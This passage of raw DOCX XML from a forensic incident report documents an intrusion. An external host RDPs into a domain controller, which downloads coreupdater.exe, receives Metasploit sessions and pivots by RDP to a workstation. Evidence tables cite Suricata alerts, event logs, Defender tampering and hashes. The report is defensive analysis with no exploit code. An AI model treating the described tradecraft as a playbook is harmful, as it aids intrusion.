              <w:t>ROOT\Microsoft\Windows Defender\Spynet</w:t>
              <w:br/>
              <w:t>Antivirus | Windows Defender | SpyNetReporting=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:47.785620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Spynet</w:t>
              <w:br/>
              <w:t>Antivirus | Windows Defender | SubmitSamplesConsent=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8619</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Exclusions\Paths</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8632</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-011: Network context: external host 194.61.24.102 RDP to the DC, DC downloads coreupdater.exe and gets Meterpreter sessions from 203.78.103.109; capture clock ~1 h behind host clock</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artifact:amcache (files)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-remotedesktopservices-rdpcorets%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>context / initial access (DC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1133, T1110, T1105, T1071</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:27.226262 → 2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Suricata (pcap clock): 'ET SCAN RDP Connection Attempt from Nmap' and ~200 'ET INFO RDP - Response To External Host' / 'MS Remote Desktop Administrator Login Request' between 10.42.85.10:3389 and 194.61.24.102 from 02:19:26 to 02:56:03; HTTP GET /coreupdater.exe from 194.61.24.102 by 10.42.85.10 at 02:24:06 (IE11 UA, SHA256 10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6); 'Possible Metasploit Payload Bind_API (from server)' 203.78.103.109:443 -&gt; 10.42.85.10 at 02:25:19, 02:29:49, 02:56:38. Clock alignment: RDP 10.42.85.10-&gt;10.42.85.115 at pcap 02:35:55 vs RdpCoreTS EID 131 03:35:54.79; desktop download at pcap 02:39:58 vs $J 03:39:57.9; C2 flow start pcap 02:40:49 vs Prefetch 03:40:49.4 → pcap timestamps ≈ host UTC − 1 h.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Network-only evidence (one source). Indicates the DC (CITADEL-DC01, 10.42.85.10) was reached over RDP from the Internet (194.61.24.102, after an Nmap RDP probe / many login requests – possible brute force) and infected with the same coreupdater.exe ~15 min (host clock ~03:24) before the pivot to DESKTOP-SDN1RPT. Host-side corroboration on the DC is out of scope. All Suricata timestamps in this case must be shifted by ≈ +1 h to be compared with host artifacts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (9)</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02:24:06.939835</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>ET INFO Executable Download from dotted-quad Host | TCP 10.42.85.10:62410 -&gt; 194.61.24.102:80 | Potentially Bad Traffic | 1:u/j8zDTczy431sRgtCbNVlYztwk= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#306</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:25:19.071794</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10.42.85.10:62414 | A Network Trojan was detected | 1:AEtaQJ4Pfkk0lfr1mrIy2qsaW8Q= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#72</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:27.226262</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>low</w:t>
              <w:br/>
              <w:t>ET INFO RDP - Response To External Host | TCP 10.42.85.10:3389 -&gt; 194.61.24.102:40054 | Misc activity | 1:APtj1Vt0V/H9g6mkVjcfylB8rkU= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.940653</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suricata/case001.pcap/eve_fileinfo.jsonl#106</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.115:3389 -&gt; 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#281</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:35:54.789286</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational 131 | Microsoft-Windows-RemoteDesktopServices-RdpCoreTS | RDP server accepted a new TCP connection | Connection Type: TCP | 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#16805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:22.980909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137.LOCAL\Administrator | LogonType 3 | LogonId: 0x842184 | AuthenticationPackageName: Kerberos | LogonProcessName: Kerberos | - | - (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>c:\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater.exe SHA1=fd153c66386ca93ec9993d66a84d6f0d129a3a5c compiled=2010-04-14 22:06:53.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</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volatility/windows.netscan.NetScan.jsonl#110</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-006: Lateral movement: RDP logon (type 10) of domain account C137\Administrator from DC 10.42.85.10</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evtx:microsoft-windows-remotedesktopservices-rdpcorets%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-terminalservices-remoteconnectionmanager%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
              <w:b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T1021.001, T1078.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240 → 2020-09-19 03:52:13.468385</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RdpCoreTS/Operational EID 131 RecordID 33 at 2020-09-19 03:35:54.789 UTC: TCP connection from 10.42.85.10:62514. Security 4624 RecordID 2112 at 03:36:22.981 (LogonType 3, NLA, C137.LOCAL\Administrator from 10.42.85.10, LogonId 0x842184). TerminalServices-RemoteConnectionManager EID 1149 RecordID 39 at 03:36:23.010 (User Administrator, Domain C137, Source 10.42.85.10). Security 4624 RecordID 2125 at 03:36:24.433 LogonType 10, TargetUserSid S-1-5-21-2232410529-1445159330-2725690660-500, LogonId 0x857E73, svchost.exe. Session end: Security 4647 RecordID 2361 at 03:52:13.468 (LogonId 0x857E73), System 7002 RecordID 962, LocalSessionManager EID 24 RecordID 100 at 03:52:13.993 (SessionID 3, 10.42.85.10). Network capture: Suricata eve_rdp 10.42.85.10:62514 -&gt; 10.42.85.115:3389 initial_request/tls_handshake (pcap clock 02:35:55 / 02:36:23, i.e. same session with a ~-1 h offset of the capture clock). Detections: Chainsaw 'RDP logon' (critical), 'User Authentication Succeeded', 'RDP Session Disconnected', Zircolite 'Admin User Remote Logon'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive. A 16-minute interactive RDP session by the built-in domain Administrator (RID 500) originating from the domain controller CITADEL-DC01 (10.42.85.10). All malicious activity on this host (Defender disabling 03:39:45, coreupdater download 03:39:57, service install 03:42:42, getsystem 03:43:14, Run key 03:44:03) falls inside this session, so this is the attacker's entry vector on the workstation. The pcap shows 194.61.24.102 hitting RDP on the DC itself shortly before (ET RDP alerts), suggesting the DC was compromised first and used as pivot with stolen domain admin credentials (hypothesis, DC not in scope).</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03:36:24.432948</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C137\Administrator | LogonType 10 | LogonId: 0x857E73 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:23.009739</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational 1149 | Microsoft-Windows-TerminalServices-RemoteConnectionManager | RDP network connection established | 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#34902</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:22.980909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137.LOCAL\Administrator | LogonType 3 | LogonId: 0x842184 | AuthenticationPackageName: Kerberos | LogonProcessName: Kerberos | - | - (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39563</w:t>
            </w:r>
          </w:p>
